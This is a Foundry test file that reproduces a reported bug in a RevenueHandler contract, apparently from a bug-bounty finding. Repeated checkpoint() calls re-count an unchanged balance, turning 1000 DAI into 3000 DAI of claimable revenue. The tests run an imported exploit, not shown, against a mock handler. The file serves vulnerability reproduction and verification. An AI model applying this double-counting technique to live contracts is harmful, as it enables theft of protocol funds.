// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38174-revenuehandlercheckpoint-isnt-correctly-immunefi-alchemix-gi.sol";

contract RevenueHandlerTripleCountTest is Test {
    /// @notice HARM: run() proves 3 checkpoints, with only 1000 DAI ever
    ///         transferred in, produce a claimable total of 3000 DAI —
    ///         matching the original finding's reported log output exactly.
    function test_exploit_threeCheckpointsTripleCountRevenue() public {
        Exploit e = new Exploit();
        e.run();

        uint256 claimable = e.revenueHandler().claimable(address(e.dai()));
        uint256 balance = e.dai().balanceOf(address(e.revenueHandler()));

        assertEq(claimable, 3000 ether, "claimable should be 3000 after 3 checkpoints");
        assertEq(balance, 1000 ether, "real DAI balance should remain 1000");
        assertEq(claimable, balance * 3, "claimable should be exactly 3x the real balance");
    }

    /// @notice Isolates the exact per-checkpoint progression: 1000, 2000, 3000.
    function test_buggyHandler_progression1000_2000_3000() public {
        MockToken dai = new MockToken();
        RevenueHandler rh = new RevenueHandler(address(dai));
        dai.mint(address(rh), 1000 ether);

        rh.checkpoint();
        assertEq(rh.claimable(address(dai)), 1000 ether);

        rh.advanceEpoch();
        rh.checkpoint();
        assertEq(rh.claimable(address(dai)), 2000 ether);

        rh.advanceEpoch();
        rh.checkpoint();
        assertEq(rh.claimable(address(dai)), 3000 ether);

        assertEq(dai.balanceOf(address(rh)), 1000 ether, "real balance never changed across all 3 checkpoints");
    }

    /// @notice Control: if a genuinely NEW deposit arrives between checkpoints,
    ///         the (buggy) accounting still correctly reflects that new amount
    ///         on top of the carried-forward balance — isolating that the bug
    ///         is specifically "re-counts UNCHANGED balance", not "checkpoint
    ///         never works".
    function test_control_newDepositIsCountedOnTopCorrectly() public {
        MockToken dai = new MockToken();
        RevenueHandler rh = new RevenueHandler(address(dai));
        dai.mint(address(rh), 1000 ether);

        rh.checkpoint();
        assertEq(rh.claimable(address(dai)), 1000 ether);

        dai.mint(address(rh), 500 ether); // genuinely NEW revenue arrives
        rh.advanceEpoch();
        rh.checkpoint();

        // Buggy accounting still re-counts the OLD 1000 on top of the new
        // total balance (1500), landing at 1000 + 1500 = 2500 -- demonstrating
        // the bug is present regardless of whether new revenue also arrived.
        assertEq(rh.claimable(address(dai)), 2500 ether);
        assertEq(dai.balanceOf(address(rh)), 1500 ether);
    }
}
